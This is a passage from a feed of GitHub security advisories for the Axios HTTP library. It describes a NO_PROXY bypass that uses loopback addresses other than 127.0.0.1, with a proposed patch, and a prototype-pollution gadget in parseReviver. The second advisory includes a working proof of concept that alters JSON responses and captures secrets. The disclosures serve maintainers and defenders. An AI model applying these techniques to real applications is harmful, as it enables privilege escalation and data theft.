Any Node.js application that meets <strong>all three of the following conditions</strong> is vulnerable:</p>
<pre><code>Condition 1:  Uses Axios 1.15.0 (latest patched) for HTTP requests
Condition 2:  Has HTTP_PROXY or HTTPS_PROXY set in its environment
              (common in corporate networks, cloud deployments,
               containerised environments, and CI/CD pipelines)
Condition 3:  Relies on NO_PROXY=localhost,127.0.0.1,::1 (or similar)
              to protect loopback or internal services from proxy routing
</code></pre>
<p><strong>Affected Deployment Environments</strong></p>
<table>
<thead>
<tr>
<th>Environment</th>
<th>Risk Level</th>
</tr>
</thead>
<tbody><tr>
<td>Cloud-hosted applications (AWS, GCP, Azure)</td>
<td>Critical</td>
</tr>
<tr>
<td>Containerised microservices (Docker, Kubernetes)</td>
<td>Critical</td>
</tr>
<tr>
<td>Corporate networks with mandatory proxy</td>
<td>High</td>
</tr>
<tr>
<td>CI/CD pipelines with proxy environment variables</td>
<td>High</td>
</tr>
<tr>
<td>On-premise servers with internal proxy</td>
<td>High</td>
</tr>
</tbody></table>
<p><strong>Scale of Exposure</strong>
Axios is one of the most widely used HTTP client libraries in the JavaScript ecosystem, with over <strong>500 million weekly downloads</strong> on npm. Any application in the above categories using Axios 1.15.0 is affected, regardless of whether the developer is aware of the underlying proxy routing logic.</p>
<p><strong>4.3 Impact Details</strong></p>
<p><strong>Impact 1 Silent Interception of Internal Service Traffic</strong></p>
<p>When an application makes a request to an internal loopback service using a non-standard loopback address (e.g., <code>http://127.0.0.2/admin</code>), Axios silently routes the request through the configured proxy instead of connecting directly.</p>
<pre><code>Developer expects:    Application → 127.0.0.2:8080 (direct)
Actual behaviour:     Application → Attacker Proxy → 127.0.0.2:8080
The proxy receives:
  - Full request URL
  - HTTP method
  - All request headers (including Authorization, Cookie, API keys)
  - Request body (for POST/PUT requests)
  - Full response from the internal service
</code></pre>
<p>The developer receives no error or warning. From the application's perspective, the request succeeds normally.</p>
<p><strong>Impact 2 — SSRF Mitigation Bypass</strong>
Many applications implement SSRF protections by configuring <code>NO_PROXY</code> to prevent requests to loopback addresses from being forwarded externally. This bypass defeats that protection entirely for any loopback address beyond <code>127.0.0.1</code>.</p>
<pre><code>SSRF Protection (as configured by developer):
  NO_PROXY = localhost,127.0.0.1,::1
What developer believes is protected:
  All loopback/internal addresses
What is actually protected:
  Only: localhost, 127.0.0.1, ::1 (3 of 16,777,216 loopback addresses)
What remains exposed:
  127.0.0.2 through 127.255.255.254 (16,777,213 addresses)
</code></pre>
<p>An attacker who can influence the target URL of an Axios request through user-supplied input, redirect chains, or other SSRF vectors can exploit this gap to reach internal services that the developer explicitly intended to protect.</p>
<p><strong>Impact 3 — Cloud Metadata Service Exposure</strong>
In cloud environments (AWS, GCP, Azure), SSRF vulnerabilities are particularly severe because they can be used to access the instance metadata service and retrieve IAM credentials, enabling full cloud account compromise.</p>
<p>While the AWS IMDSv2 service is reachable at <code>169.254.169.254</code> (not a loopback address), many cloud deployments run internal metadata proxies, credential servers, or service discovery endpoints bound to non-standard loopback addresses within the <code>127.0.0.0/8</code> range. An attacker reaching any of these services through the bypass could:</p>
<ul>
<li>Retrieve temporary IAM credentials</li>
<li>Access environment variables containing secrets</li>
<li>Enumerate internal service configurations</li>
<li>Pivot to other internal services via the compromised credentials</li>
</ul>
<p><strong>Impact 4 — Confidential Data Exfiltration</strong>
Any internal service binding to a <code>127.x.x.x</code> address other than <code>127.0.0.1</code> is fully exposed. This includes:</p>
<table>
<thead>
<tr>
<th>Internal Service Type</th>
<th>Exposed Data</th>
</tr>
</thead>
<tbody><tr>
<td>Admin panels / dashboards</td>
<td>User data, configuration, logs</td>
</tr>
<tr>
<td>Internal APIs</td>
<td>Business logic, database contents</td>
</tr>
<tr>
<td>Secret managers / vaults</td>
<td>API keys, tokens, certificates</td>
</tr>
<tr>
<td>Health check endpoints</td>
<td>Infrastructure topology</td>
</tr>
<tr>
<td>Development services</td>
<td>Source code, environment variables</td>
</tr>
</tbody></table>
<p><strong>Impact 5 — No Indication of Compromise</strong>
A particularly dangerous characteristic of this vulnerability is that it is <strong>completely silent</strong> neither the application nor the developer receives any indication that requests are being routed incorrectly. There are no error messages, no exceptions thrown, and no changes in application behaviour. The proxy interception is entirely transparent from the application's perspective, making detection extremely difficult without active network monitoring.</p>
<p><strong>4.4 Comparison with Original Vulnerability</strong></p>
<table>
<thead>
<tr>
<th>Internal Service Type</th>
<th>Exposed Data</th>
<th>Exposed Data</th>
</tr>
</thead>
<tbody><tr>
<td>Attack method</td>
<td>Use localhost. or [::1]</td>
<td>Use any 127.x.x.x ≠ 127.0.0.1</td>
</tr>
<tr>
<td>Patch status</td>
<td>Fixed in 1.15.0</td>
<td>Not fixed in 1.15.0</td>
</tr>
<tr>
<td>CVSS score</td>
<td>9.3 Critical</td>
<td>9.9 Critical or (equivalent)</td>
</tr>
<tr>
<td>Attacker effort</td>
<td>Trivial</td>
<td>Trivial</td>
</tr>
<tr>
<td>Detection by developer</td>
<td>None</td>
<td>None</td>
</tr>
<tr>
<td>Impact</td>
<td>SSRF / proxy bypass</td>
<td>SSRF / proxy bypass (identical)</td>
</tr>
</tbody></table>
<p>The severity of this finding is equivalent to the original vulnerability because the attack conditions, exploitation technique, and resulting impact are identical. The only difference is the specific input used to trigger the bypass, which the existing patch completely fails to address.</p>
<p><strong>5. Technical Remediation &amp; Proposed Fix</strong></p>
<p><strong>5.1 Vulnerable Code Block</strong></p>
<p>The vulnerability resides in <code>lib/helpers/shouldBypassProxy.js</code> at lines 1–3. The following is the exact code extracted from Axios 1.15.0:</p>
<pre><code>// lib/helpers/shouldBypassProxy.js — Axios 1.15.0
// Lines 1–3 (VULNERABLE)
const LOOPBACK_ADDRESSES = new Set(['localhost', '127.0.0.1', '::1']);
const isLoopback = (host) =&gt; LOOPBACK_ADDRESSES.has(host);
</code></pre>
<p>This hardcoded <code>Set</code> is subsequently used at line 108 during the final NO_PROXY match evaluation:</p>
<pre><code>// lib/helpers/shouldBypassProxy.js — Line 108 (VULNERABLE USAGE)
return hostname === entryHost || (isLoopback(hostname) &amp;&amp; isLoopback(entryHost));
//                                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
// isLoopback("127.0.0.2") → LOOPBACK_ADDRESSES.has("127.0.0.2") → FALSE
// This causes the match to fail for any 127.x.x.x address beyond 127.0.0.1
</code></pre>
<p><strong>Why this is dangerous:</strong> The <code>Set</code> performs a strict membership check. Any IPv4 loopback address outside the three hardcoded entries returns <code>false</code>, causing <code>shouldBypassProxy()</code> to return <code>false</code> and silently route the request through the configured proxy.</p>
<p><strong>5.2 Proposed Patched Code</strong>
Replace lines 1–3 in <code>lib/helpers/shouldBypassProxy.js</code> with the following RFC-compliant implementation:</p>
<pre><code>// lib/helpers/shouldBypassProxy.js
// Lines 1–3 (PROPOSED FIX — RFC 1122 §3.2.1.3 Compliant)
const isLoopback = (host) =&gt; {
  // Named loopback hostname
  if (host === 'localhost') return true;
  // IPv6 loopback address
  if (host === '::1') return true;
  // Full IPv4 loopback subnet: 127.0.0.0/8 (RFC 1122 §3.2.1.3)
  // Matches any address from 127.0.0.0 through 127.255.255.254
  const parts = host.split('.');
  return (
    parts.length === 4 &amp;&amp;
    parts[0] === '127' &amp;&amp;
    parts.every((p) =&gt; /^\d+$/.test(p) &amp;&amp; Number(p) &gt;= 0 &amp;&amp; Number(p) &lt;= 255)
  );
};
</code></pre>
<p><strong>5.3 Diff View — Before vs After</strong></p>
<pre><code>// lib/helpers/shouldBypassProxy.js
- const LOOPBACK_ADDRESSES = new Set(['localhost', '127.0.0.1', '::1']);
-
- const isLoopback = (host) =&gt; LOOPBACK_ADDRESSES.has(host);
+ const isLoopback = (host) =&gt; {
+   if (host === 'localhost') return true;
+   if (host === '::1') return true;
+   const parts = host.split('.');
+   return (
+     parts.length === 4 &amp;&amp;
+     parts[0] === '127' &amp;&amp;
+     parts.every((p) =&gt; /^\d+$/.test(p) &amp;&amp; Number(p) &gt;= 0 &amp;&amp; Number(p) &lt;= 255)
+   );
+ };
</code></pre>
<p>All other code in <code>shouldBypassProxy.js</code> remains unchanged. No other files require modification.</p>
<p><strong>5.4 Why This Fix Must Be Applied</strong></p>
<p><strong>Reason 1 — RFC 1122 Compliance</strong></p>
<p>The current implementation violates <strong>RFC 1122 §3.2.1.3</strong>, which defines the entire <code>127.0.0.0/8</code> block as the IPv4 loopback address range not just the single address <code>127.0.0.1</code>. The proposed fix aligns Axios with the standard, ensuring that all valid loopback addresses are recognised and handled consistently.</p>
<pre><code>RFC 1122 §3.2.1.3:
"The address 127.0.0.0/8 is assigned for loopback.
 A datagram sent by a higher-level protocol to a loopback
 address MUST NOT appear on any network."
Current fix covers  :  3 addresses (localhost, 127.0.0.1, ::1)
Proposed fix covers :  16,777,216 addresses (entire 127.0.0.0/8 + loopback names)
</code></pre>
<p><strong>Reason 2 — The Existing Patch Has Already Failed Once</strong></p>
<p>The patch for GHSA-3p68-rc4w-qgx5 was released with the explicit intent of securing NO_PROXY hostname matching for loopback addresses. Within the same release (1.15.0), the protection can be bypassed by substituting <code>127.0.0.1</code> with any other address in the <code>127.0.0.0/8</code> range. Leaving this gap unaddressed means that the patch creates a <strong>false sense of security</strong> developers believe their loopback traffic is protected when it is not.</p>
<p><strong>Reason 3 — Real Operating System Behaviour</strong>
On Linux the dominant platform for Node.js server deployments the kernel routes the <strong>entire <code>127.0.0.0/8</code> subnet</strong> to the loopback interface <code>lo</code> by default. This means any address in that range functions identically to <code>127.0.0.1</code> at the networking level.</p>
<pre><code># Linux routing table — default configuration
$ ip route show table local | grep "127"
local 127.0.0.0/8 dev lo proto kernel scope host src 127.0.0.1
# Proof: 127.0.0.2 is a valid loopback address on Linux
$ ping -c 1 127.0.0.2
PING 127.0.0.2: 56 data bytes
64 bytes from 127.0.0.2: icmp_seq=0 ttl=64 time=0.045 ms
</code></pre>
<img width="711" height="181" alt="04_linux_loopback_subnet_proof" src="https://github.com/user-attachments/assets/fd0f8430-37c5-4597-b2d9-8e27e479d7b2">

<p>Axios's current implementation does not reflect this operating system behaviour, resulting in an inconsistency between what the OS considers loopback and what Axios treats as loopback.</p>
<img width="588" height="198" alt="06_ping_127 0 0 2_loopback_confirmed" src="https://github.com/user-attachments/assets/23bf1ab8-1bd6-4f39-88a7-93c518d72990">

<p><strong>Reason 4 — The Proposed Fix Has Zero Performance Impact</strong>
The existing solution uses a <code>Set.has()</code> lookup an O(1) operation. The proposed fix replaces this with:</p>
<ol>
<li>Two direct string comparisons (<code>'localhost'</code>, <code>'::1'</code>) — O(1)</li>
<li>A <code>split('.')</code> and array validation — O(1) with a fixed-length array of 4 elements
The computational cost is <strong>equivalent or lower</strong> than the current approach, and the fix introduces no new external dependencies.</li>
</ol>
<p><strong>Reason 5 — The Fix Is Minimal and Surgical</strong>
The proposed change modifies only <strong>3 lines</strong> of a single file. It does not alter:</p>
<ul>
<li>The <code>parseNoProxyEntry()</code> function</li>
<li>The <code>normalizeNoProxyHost()</code> function</li>
<li>The <code>shouldBypassProxy()</code> main function logic</li>
<li>Any other file in the codebase</li>
</ul>
<p>This minimises regression risk and makes the fix straightforward to review, test, and backport to older supported branches.</p>
<p><strong>Reason 6 — Resilient to Alternative IP Encodings</strong>
Because Axios normalises the request URL using Node's native <code>new URL()</code> parser before passing it to <code>shouldBypassProxy()</code>, alternative IP encodings (such as octal <code>0177.0.0.1</code>, hex <code>0x7f.0.0.1</code>, or integer <code>2130706433</code>) are already resolved into their standard IPv4 dotted-decimal format. This means the proposed <code>.split('.')</code> validation logic is completely robust and cannot be bypassed using URL-encoded IP obfuscation techniques.</p>
<p><strong>5.5 Additional Recommendation — IPv6 Loopback Range</strong></p>
<p>While the primary bypass demonstrated in this report targets the IPv4 <code>127.0.0.0/8</code> range, the Axios team should also consider validating the full IPv6 loopback representation. The current implementation recognises only <code>::1</code>. A more complete check would also handle the full-form notation:</p>
<pre><code>// Additional IPv6 loopback representations to consider:
'0:0:0:0:0:0:0:1'      // Full notation of ::1
'::ffff:127.0.0.1'     // IPv4-mapped IPv6 loopback
'::ffff:7f00:1'        // Hex IPv4-mapped IPv6 loopback
</code></pre>
<p>Normalising these representations before comparison would make the NO_PROXY implementation comprehensively RFC-compliant across both IPv4 and IPv6 address families.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-pmwg-cvhr-8vh7">https://github.com/axios/axios/security/advisories/GHSA-pmwg-cvhr-8vh7</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42043">https://nvd.nist.gov/vuln/detail/CVE-2026-42043</a></li>
<li><a href="https://github.com/advisories/GHSA-pmwg-cvhr-8vh7">https://github.com/advisories/GHSA-pmwg-cvhr-8vh7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pmwg-cvhr-8vh7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T00:20:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Axios: Invisible JSON Response Tampering via Prototype Pollution Gadget in `parseReviver`]]></title>
        <id>https://github.com/advisories/GHSA-3w6x-2g7m-8v23</id>
        <link href="https://github.com/advisories/GHSA-3w6x-2g7m-8v23"/>
        <updated>2026-05-05T00:19:34.000Z</updated>
        <content type="html"><![CDATA[<h1 id="vulnerability-disclosure-invisible-json-response-tampering-via-prototype-pollution-gadget-in-parsereviver">Vulnerability Disclosure: Invisible JSON Response Tampering via Prototype Pollution Gadget in <code>parseReviver</code></h1>
<h2 id="summary">Summary</h2>
<p>The Axios library is vulnerable to a Prototype Pollution "Gadget" attack that allows any <code>Object.prototype</code> pollution in the application's dependency tree to be escalated into <strong>surgical, invisible modification of all JSON API responses</strong> — including privilege escalation, balance manipulation, and authorization bypass.</p>
<p>The default <code>transformResponse</code> function at <code>lib/defaults/index.js:124</code> calls <code>JSON.parse(data, this.parseReviver)</code>, where <code>this</code> is the merged config object. Because <code>parseReviver</code> is <strong>not present in Axios defaults, not validated by <code>assertOptions</code>, and not subject to any constraints</strong>, a polluted <code>Object.prototype.parseReviver</code> function is called for <strong>every key-value pair</strong> in every JSON response, allowing the attacker to selectively modify individual values while leaving the rest of the response intact.</p>
<p>This is <strong>strictly more powerful</strong> than the <code>transformResponse</code> gadget because:</p>
<ol>
<li><strong>No constraints</strong> — the reviver can return any value (no "must return true" requirement)</li>
<li><strong>Selective modification</strong> — individual JSON keys can be changed while others remain untouched</li>
<li><strong>Invisible</strong> — the response structure and most values look completely normal</li>
<li><strong>Simultaneous exfiltration</strong> — the reviver sees the original values before modification</li>
</ol>
<p><strong>Severity:</strong> Critical (CVSS 9.1)
<strong>Affected Versions:</strong> All versions (v0.x - v1.x including v1.15.0)
<strong>Vulnerable Component:</strong> <code>lib/defaults/index.js:124</code> (JSON.parse with prototype-inherited reviver)</p>
<h2 id="cwe">CWE</h2>
<ul>
<li><strong>CWE-1321:</strong> Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')</li>
<li><strong>CWE-915:</strong> Improperly Controlled Modification of Dynamically-Determined Object Attributes</li>
</ul>
<h2 id="cvss-31">CVSS 3.1</h2>
<p><strong>Score: 9.1 (Critical)</strong></p>
<p>Vector: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N</code></p>
<table>
<thead>
<tr>
<th>Metric</th>
<th>Value</th>
<th>Justification</th>
</tr>
</thead>
<tbody><tr>
<td>Attack Vector</td>
<td>Network</td>
<td>PP is triggered remotely via any vulnerable dependency</td>
</tr>
<tr>
<td>Attack Complexity</td>
<td>Low</td>
<td>Once PP exists, single property assignment. Consistent with GHSA-fvcv-3m26-pcqx scoring methodology</td>
</tr>
<tr>
<td>Privileges Required</td>
<td>None</td>
<td>No authentication needed</td>
</tr>
<tr>
<td>User Interaction</td>
<td>None</td>
<td>No user interaction required</td>
</tr>
<tr>
<td>Scope</td>
<td>Unchanged</td>
<td>Within the application process</td>
</tr>
<tr>
<td>Confidentiality</td>
<td><strong>High</strong></td>
<td>The reviver receives every key-value pair from every JSON response — full data exfiltration. In the PoC, <code>apiKey: "sk-secret-internal-key"</code> is captured</td>
</tr>
<tr>
<td>Integrity</td>
<td><strong>High</strong></td>
<td>Arbitrary, selective modification of any JSON value. No constraints. In the PoC, <code>isAdmin: false → true</code>, <code>role: "viewer" → "admin"</code>, <code>balance: 100 → 999999</code>. The response looks completely normal except for the surgically altered values</td>
</tr>
<tr>
<td>Availability</td>
<td>None</td>
<td>No crash, no error — the attack is entirely silent</td>
</tr>
</tbody></table>
<h3 id="comparison-with-all-known-axios-pp-gadgets">Comparison with All Known Axios PP Gadgets</h3>
<table>
<thead>
<tr>
<th>Factor</th>
<th>GHSA-fvcv-3m26-pcqx (Header Injection)</th>
<th>transformResponse</th>
<th>proxy (MITM)</th>
<th><strong>parseReviver (This)</strong></th>
</tr>
</thead>
<tbody><tr>
<td>PP target</td>
<td><code>Object.prototype['header']</code></td>
<td><code>Object.prototype.transformResponse</code></td>
<td><code>Object.prototype.proxy</code></td>
<td><code>Object.prototype.parseReviver</code></td>
</tr>
<tr>
<td>Fixed by 1.15.0?</td>
<td>Yes</td>
<td>No</td>
<td>No</td>
<td><strong>No</strong></td>
</tr>
<tr>
<td>Constraints</td>
<td>N/A (fixed)</td>
<td><strong>Must return <code>true</code></strong></td>
<td>None</td>
<td><strong>None</strong></td>
</tr>
<tr>
<td>Data modification</td>
<td>Header injection only</td>
<td>Response replaced with <code>true</code></td>
<td>Full MITM</td>
<td><strong>Selective per-key modification</strong></td>
</tr>
<tr>
<td>Stealth</td>
<td>Request anomaly visible</td>
<td>Response becomes <code>true</code> (obvious)</td>
<td>Proxy visible in network</td>
<td><strong>Completely invisible</strong></td>
</tr>
<tr>
<td>Data access</td>
<td>Headers only</td>
<td><code>this.auth</code> + raw response</td>
<td>All traffic</td>
<td><strong>Every JSON key-value pair</strong></td>
</tr>
<tr>
<td>Validated?</td>
<td>N/A</td>
<td><code>assertOptions</code> validates</td>
<td>Not validated</td>
<td><strong>Not validated</strong></td>
</tr>
<tr>
<td>In defaults?</td>
<td>N/A</td>
<td>Yes → goes through mergeConfig</td>
<td>No → bypasses mergeConfig</td>
<td><strong>No → bypasses mergeConfig</strong></td>
</tr>
</tbody></table>
<h2 id="usage-of-helper-vulnerabilities">Usage of "Helper" Vulnerabilities</h2>
<p>This vulnerability requires <strong>Zero Direct User Input</strong>.</p>
<p>If an attacker can pollute <code>Object.prototype</code> via any other library in the stack (e.g., <code>qs</code>, <code>minimist</code>, <code>lodash</code>, <code>body-parser</code>), the polluted <code>parseReviver</code> function is automatically used by every Axios request that receives a JSON response. The developer's code is completely safe — no configuration errors needed.</p>
<h2 id="root-cause-analysis">Root Cause Analysis</h2>
<h3 id="the-attack-path">The Attack Path</h3>
<pre><code>Object.prototype.parseReviver = function(key, value) { /* malicious */ }
         │
         ▼
  mergeConfig(defaults, userConfig)
         │
         │  parseReviver NOT in defaults → NOT iterated by mergeConfig
         │  parseReviver NOT in userConfig → NOT iterated by mergeConfig
         │  Merged config has NO own parseReviver property
         │
         ▼
  transformData.call(config, config.transformResponse, response)
         │
         │  Default transformResponse function runs (NOT overridden)
         │
         ▼
  defaults/index.js:124: JSON.parse(data, this.parseReviver)
         │
         │  this = config (merged config object, plain {})
         │  config.parseReviver → NOT own property → traverses prototype chain
         │  → finds Object.prototype.parseReviver → attacker's function!
         │
         ▼
  JSON.parse calls reviver for EVERY key-value pair
         │
         │  Attacker can: read original value, modify it, return anything
         │  No validation, no constraints, no assertOptions check
         │
         ▼
  Application receives surgically modified JSON response
</code></pre>
<h3 id="why-parsereviver-bypasses-all-existing-protections">Why <code>parseReviver</code> Bypasses ALL Existing Protections</h3>
<ol>
<li><p><strong>Not in defaults</strong> (<code>lib/defaults/index.js</code>): <code>parseReviver</code> is not defined in the defaults object, so <code>mergeConfig</code>'s <code>Object.keys({...defaults, ...userConfig})</code> iteration never encounters it. The merged config has no own <code>parseReviver</code> property.</p>
</li>
<li><p><strong>Not in assertOptions schema</strong> (<code>lib/core/Axios.js:135-142</code>): The schema only contains <code>{baseUrl, withXsrfToken}</code>. <code>parseReviver</code> is not validated.</p>
</li>
<li><p><strong>No type check</strong>: The <code>JSON.parse</code> API accepts any function as a reviver. There is no check that <code>this.parseReviver</code> is intentionally set.</p>
</li>
<li><p><strong>Works INSIDE the default transform</strong>: Unlike <code>transformResponse</code> pollution (which replaces the entire transform and is caught by <code>assertOptions</code>), <code>parseReviver</code> pollution injects into the DEFAULT <code>transformResponse</code> function's <code>JSON.parse</code> call. The default function itself is not replaced, so <code>assertOptions</code> has nothing to catch.</p>
</li>
</ol>
<h3 id="vulnerable-code">Vulnerable Code</h3>
<p><strong>File:</strong> <code>lib/defaults/index.js</code>, line 124</p>
<pre><code class="language-javascript">transformResponse: [
  function transformResponse(data) {
    // ... transitional checks ...
    if (data &amp;&amp; utils.isString(data) &amp;&amp; ((forcedJSONParsing &amp;&amp; !this.responseType) || JSONRequested)) {
      // ...
      try {
        return JSON.parse(data, this.parseReviver);
        //                      ^^^^^^^^^^^^^^^^^
        //                      this = config
        //                      config.parseReviver → prototype chain → attacker's function
      } catch (e) {
        // ...
      }
    }
    return data;
  },
],
</code></pre>
<h2 id="proof-of-concept">Proof of Concept</h2>
<pre><code class="language-javascript">import http from 'http';
import axios from './index.js';

// Server returns a realistic authorization response
const server = http.createServer((req, res) =&gt; {
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({
    user: 'john',
    role: 'viewer',
    isAdmin: false,
    canDelete: false,
    balance: 100,
    permissions: ['read'],
    apiKey: 'sk-secret-internal-key',
  }));
});
await new Promise(r =&gt; server.listen(0, r));
const port = server.address().port;

// === Before Pollution ===
const before = await axios.get(`http://127.0.0.1:${port}/api/me`);
console.log('Before:', JSON.stringify(before.data));
// {"user":"john","role":"viewer","isAdmin":false,"canDelete":false,"balance":100,...}

// === Simulate Prototype Pollution ===
let stolen = {};
Object.prototype.parseReviver = function(key, value) {
  // Silently capture all original values
  if (key &amp;&amp; typeof value !== 'object') stolen[key] = value;
  // Surgically modify specific values
  if (key === 'isAdmin') return true;       // false → true
  if (key === 'role') return 'admin';       // viewer → admin
  if (key === 'canDelete') return true;     // false → true
  if (key === 'balance') return 999999;     // 100 → 999999
  return value;                              // everything else unchanged
};

// === After Pollution — same code, same URL ===
const after = await axios.get(`http://127.0.0.1:${port}/api/me`);
console.log('After: ', JSON.stringify(after.data));
// {"user":"john","role":"admin","isAdmin":true,"canDelete":true,"balance":999999,...}

console.log('Stolen:', JSON.stringify(stolen));
// {"user":"john","role":"viewer","isAdmin":false,...,"apiKey":"sk-secret-internal-key"}

delete Object.prototype.parseReviver;
server.close();
</code></pre>
<h2 id="verified-poc-output">Verified PoC Output</h2>
<pre><code>[1] Normal request (before pollution):
    response.data: {"user":"john","role":"viewer","isAdmin":false,"canDelete":false,
                     "balance":100,"permissions":["read"],"apiKey":"sk-secret-internal-key"}
    isAdmin: false
    role: viewer

[2] Prototype Pollution: Object.prototype.parseReviver
    Polluted with selective value modifier

[3] Same request (after pollution):
    response.data: {"user":"john","role":"admin","isAdmin":true,"canDelete":true,
                     "balance":999999,"permissions":["read","write","delete","admin"],
                     "apiKey":"sk-secret-internal-key"}
    isAdmin: true (was: false)
    role: admin (was: viewer)
    canDelete: true (was: false)
    balance: 999999 (was: 100)

[4] Exfiltrated data (stolen silently):
    apiKey: sk-secret-internal-key
    All captured: {"user":"john","role":"viewer","isAdmin":false,"canDelete":false,
                   "balance":100,"apiKey":"sk-secret-internal-key"}

[5] Why this bypasses all checks:
    parseReviver in defaults? NO
    parseReviver in assertOptions schema? NO
    parseReviver validated anywhere? NO
    Must return true? NO — can return ANY value
    Replaces entire transform? NO — works INSIDE default JSON.parse
</code></pre>
<h2 id="impact-analysis">Impact Analysis</h2>
<h3 id="1-authorization--privilege-escalation">1. Authorization / Privilege Escalation</h3>
<pre><code class="language-javascript">// Server returns: {"role":"viewer","isAdmin":false}
// Application sees: {"role":"admin","isAdmin":true}
// → Application grants admin access to unprivileged user
</code></pre>
<h3 id="2-financial-manipulation">2. Financial Manipulation</h3>
<pre><code class="language-javascript">// Server returns: {"balance":100,"approved":false}
// Application sees: {"balance":999999,"approved":true}
// → Application approves a transaction that should be rejected
</code></pre>
<h3 id="3-security-control-bypass">3. Security Control Bypass</h3>
<pre><code class="language-javascript">// Server returns: {"mfaRequired":true,"accountLocked":true}
// Application sees: {"mfaRequired":false,"accountLocked":false}
// → Application skips MFA and unlocks a locked account
</code></pre>
<h3 id="4-silent-data-exfiltration">4. Silent Data Exfiltration</h3>
<p>The reviver function receives the <strong>original</strong> value before modification. The attacker can silently capture all API keys, tokens, internal data, and PII from every JSON response while the application continues to function normally.</p>
<h3 id="5-universal-and-invisible">5. Universal and Invisible</h3>
<ul>
<li>Affects <strong>every</strong> Axios request that receives a JSON response</li>
<li>The response structure is intact — only specific values are changed</li>
<li>No errors, no crashes, no suspicious behavior</li>
<li>Application logs show normal-looking API responses with tampered values</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<h3 id="fix-1-use-hasownproperty-check-before-using-parsereviver">Fix 1: Use <code>hasOwnProperty</code> check before using <code>parseReviver</code></h3>
<pre><code class="language-javascript">// FIXED: lib/defaults/index.js
const reviver = Object.prototype.hasOwnProperty.call(this, 'parseReviver')
  ? this.parseReviver
  : undefined;
return JSON.parse(data, reviver);
</code></pre>
<h3 id="fix-2-use-null-prototype-config-object">Fix 2: Use null-prototype config object</h3>
<pre><code class="language-javascript">// In lib/core/mergeConfig.js
const config = Object.create(null);
</code></pre>
<h3 id="fix-3-validate-parsereviver-type-and-source">Fix 3: Validate <code>parseReviver</code> type and source</h3>
<pre><code class="language-javascript">// FIXED: lib/defaults/index.js
const reviver = (typeof this.parseReviver === 'function' &amp;&amp;
  Object.prototype.hasOwnProperty.call(this, 'parseReviver'))
  ? this.parseReviver
  : undefined;
return JSON.parse(data, reviver);
</code></pre>
<h2 id="relationship-to-other-reported-gadgets">Relationship to Other Reported Gadgets</h2>
<p>This vulnerability shares the same <strong>root cause class</strong> — unsafe prototype chain traversal on the merged config object — with two other reported gadgets:</p>
<table>
<thead>
<tr>
<th>Report</th>
<th>PP Target</th>
<th>Code Location</th>
<th>Fix Location</th>
<th>Impact</th>
</tr>
</thead>
<tbody><tr>
<td>axios_26</td>
<td><code>transformResponse</code></td>
<td><code>mergeConfig.js:49</code> (defaultToConfig2)</td>
<td><code>mergeConfig.js</code></td>
<td>Credential theft, response replaced with <code>true</code></td>
</tr>
<tr>
<td>axios_30</td>
<td><code>proxy</code></td>
<td><code>http.js:670</code> (direct property access)</td>
<td><code>http.js</code></td>
<td>Full MITM, traffic interception</td>
</tr>
<tr>
<td><strong>axios_31 (this)</strong></td>
<td><code>parseReviver</code></td>
<td><code>defaults/index.js:124</code> (this.parseReviver)</td>
<td><code>defaults/index.js</code></td>
<td><strong>Selective JSON value tampering + data exfiltration</strong></td>
</tr>
</tbody></table>
<h3 id="why-these-are-distinct-vulnerabilities">Why These Are Distinct Vulnerabilities</h3>
<ol>
<li><strong>Different polluted properties:</strong> Each targets a different <code>Object.prototype</code> key.</li>
<li><strong>Different code paths:</strong> <code>transformResponse</code> enters via <code>mergeConfig</code>; <code>proxy</code> is read directly by <code>http.js</code>; <code>parseReviver</code> is read inside the default <code>transformResponse</code> function's <code>JSON.parse</code> call.</li>
<li><strong>Different fix locations:</strong> Fixing <code>mergeConfig.js</code> (axios_26) does NOT fix <code>defaults/index.js:124</code> (this vulnerability). Fixing <code>http.js:670</code> (axios_30) does NOT fix this either. Each requires a separate patch.</li>
<li><strong>Different impact profiles:</strong> <code>transformResponse</code> is constrained to return <code>true</code>; <code>proxy</code> requires a proxy server; <code>parseReviver</code> enables constraint-free selective value modification.</li>
</ol>
<h3 id="comprehensive-fix">Comprehensive Fix</h3>
<p>While each vulnerability requires a location-specific patch, the comprehensive fix is to use <strong>null-prototype objects</strong> (<code>Object.create(null)</code>) for the merged config in <code>mergeConfig.js</code>, which would eliminate prototype chain traversal for all config property accesses and address all three gadgets at once. The maintainer may choose to assign a single CVE covering the root cause or separate CVEs for each distinct exploitation path — we defer to the maintainer's judgment on this.</p>
<h2 id="resources">Resources</h2>
<ul>
<li><a href="https://cwe.mitre.org/data/definitions/1321.html">CWE-1321: Prototype Pollution</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/915.html">CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes</a></li>
<li><a href="https://github.com/advisories/GHSA-fvcv-3m26-pcqx">GHSA-fvcv-3m26-pcqx: Related PP Gadget in Axios (Fixed in 1.15.0)</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse#the_reviver_parameter">MDN: JSON.parse reviver</a></li>
<li><a href="https://github.com/axios/axios">Axios GitHub Repository</a></li>
</ul>
<h2 id="timeline">Timeline</h2>
<table>
<thead>
<tr>
<th>Date</th>
<th>Event</th>
</tr>
</thead>
<tbody><tr>
<td>2026-04-16</td>
<td>Vulnerability discovered during source code audit</td>
</tr>
<tr>
<td>2026-04-16</td>
<td>PoC developed and verified — selective response tampering confirmed</td>
</tr>
<tr>
<td>TBD</td>
<td>Report submitted to vendor via GitHub Security Advisory</td>
</tr>
</tbody></table>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-3w6x-2g7m-8v23">https://github.com/axios/axios/security/advisories/GHSA-3w6x-2g7m-8v23</a></li>
